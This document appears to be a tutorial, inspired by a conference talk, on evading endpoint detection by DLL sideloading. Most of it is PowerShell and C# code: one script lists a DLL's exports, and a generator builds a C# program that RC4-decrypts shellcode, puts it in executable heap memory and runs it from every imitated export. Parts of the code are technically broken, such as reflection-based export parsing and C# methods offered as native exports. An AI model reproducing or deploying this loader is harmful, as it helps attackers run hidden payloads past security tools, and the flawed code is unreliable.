
### Inspiration: # Evading EDR by DLL sideloading with C# - Gary Lobermier | CypherCon 6.0 (https://www.youtube.com/watch?v=YH5l3Zoy5cg)


Creating a PowerShell script that extracts the function address table (also known as the Export Address Table) from a DLL, then generates a C# program to imitate those functions for DLL sideloading, is a multi-step process. This approach involves several stages: analyzing the DLL to get the exported functions, generating the corresponding C# code, and integrating shellcode execution using `HeapCreate`, `HeapAlloc`, and RC4 decryption.

### **Step 1: Analyze the DLL to Extract Exported Functions**

First, we need to extract the exported functions from a DLL. PowerShell can be used to parse the DLL’s export table.

#### **PowerShell Script to Extract Exported Functions**

```powershell
function Get-ExportedFunctions {
    param (
        [string]$DllPath
    )

    $dll = [System.Reflection.Assembly]::LoadFile($DllPath)
    $exports = $dll.GetExportedTypes()

    $functions = @()
    foreach ($export in $exports) {
        $methods = $export.GetMethods([System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
        foreach ($method in $methods) {
            $functions += $method.Name
        }
    }

    return $functions
}

# Example usage:
$exportedFunctions = Get-ExportedFunctions -DllPath "C:\Path\To\Your.dll"
$exportedFunctions | ForEach-Object { Write-Output $_ }
```

**Note**: The above PowerShell script assumes the DLL is a .NET assembly. For a native DLL, you would need to parse the export table manually, which is more complex and typically involves lower-level programming in C/C++.

### **Step 2: Generate the C# Program**

Once the exported functions are retrieved, we can generate a C# program that imitates these functions and includes the shellcode execution logic.

#### **C# Code Generation Script**

Here’s a PowerShell script that generates a basic C# program:

```powershell
param (
    [string]$DllPath,
    [string]$OutputFile = "GeneratedProgram.cs"
)

function Generate-CSharpCode {
    param (
        [string[]]$Functions
    )

    $template = @"
using System;
using System.Runtime.InteropServices;

class Program
{
    static void Main(string[] args)
    {
        // Shellcode execution entry point
        Execute();
    }

    // Shellcode execution method
    static void Execute()
    {
        byte[] encryptedShellcode = { /* RC4 encrypted shellcode here */ };
        byte[] key = { /* RC4 key here */ };

        byte[] shellcode = RC4Decrypt(encryptedShellcode, key);

        IntPtr heap = HeapCreate(0x00040000, (UIntPtr)shellcode.Length, UIntPtr.Zero);
        IntPtr addr = HeapAlloc(heap, 0x00000008, (UIntPtr)shellcode.Length);

        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        var execute = (Action)Marshal.GetDelegateForFunctionPointer(addr, typeof(Action));
        execute();
    }

    static byte[] RC4Decrypt(byte[] data, byte[] key)
    {
        byte[] s = new byte[256];
        byte[] k = new byte[256];
        byte temp;
        int i, j;

        for (i = 0; i < 256; i++)
        {
            s[i] = (byte)i;
            k[i] = key[i % key.Length];
        }

        j = 0;
        for (i = 0; i < 256; i++)
        {
            j = (j + s[i] + k[i]) % 256;
            temp = s[i];
            s[i] = s[j];
            s[j] = temp;
        }

        i = j = 0;
        byte[] result = new byte[data.Length];
        for (int x = 0; x < data.Length; x++)
        {
            i = (i + 1) % 256;
            j = (j + s[i]) % 256;
            temp = s[i];
            s[i] = s[j];
            s[j] = temp;
            result[x] = (byte)(data[x] ^ s[(s[i] + s[j]) % 256]);
        }

        return result;
    }

    // Imitating exported functions from the DLL
$(
    foreach ($function in $Functions) {
        "    public static void $function() { Execute(); }"
    }
)
}
"@

    return $template
}

$exportedFunctions = Get-ExportedFunctions -DllPath $DllPath
$code = Generate-CSharpCode -Functions $exportedFunctions

# Write the generated code to a file
$code | Out-File -FilePath $OutputFile
Write-Host "C# program generated and saved to $OutputFile"
```

### **Explanation of the Generated C# Code**

- **Exported Functions**: The C# code generated by this script includes a method for each function exported by the DLL. Each method simply calls the `Execute()` method.
- **Execute Method**: This method contains the core logic to decrypt the shellcode using RC4, allocate memory using `HeapCreate` and `HeapAlloc`, and execute the shellcode.
- **RC4 Decryption**: The RC4 decryption algorithm is implemented in the `RC4Decrypt` method, which takes the encrypted shellcode and a key as inputs.

### **Step 3: Customize the Shellcode and Key**

After generating the C# program, you’ll need to insert your RC4-encrypted shellcode and the corresponding key into the `Execute()` method. The shellcode should be placed in the `encryptedShellcode` array, and the RC4 key should be placed in the `key` array.

### **Step 4: Compile and Use the Generated DLL**

Once the C# program is generated and customized, you can compile it using the C# compiler (e.g., `csc.exe`). The compiled DLL can then be used for DLL sideloading attacks, where it imitates the original DLL’s exported functions but ultimately executes the shellcode.

### **Caveats and Considerations**

- **Detection**: This method of DLL sideloading and function imitation can be detected by modern EDR/AV solutions. It’s important to test in a controlled environment.
- **Legal and Ethical Use**: Ensure you have explicit permission to perform these actions in your testing environment. Unauthorized use can lead to legal consequences.
- **Error Handling**: The generated code assumes all functions are void and do not take parameters. If the original DLL’s functions have different signatures, further customization will be needed.

This approach automates the creation of a DLL that mimics the original’s exported functions and embeds shellcode execution, making it useful for advanced red team operations.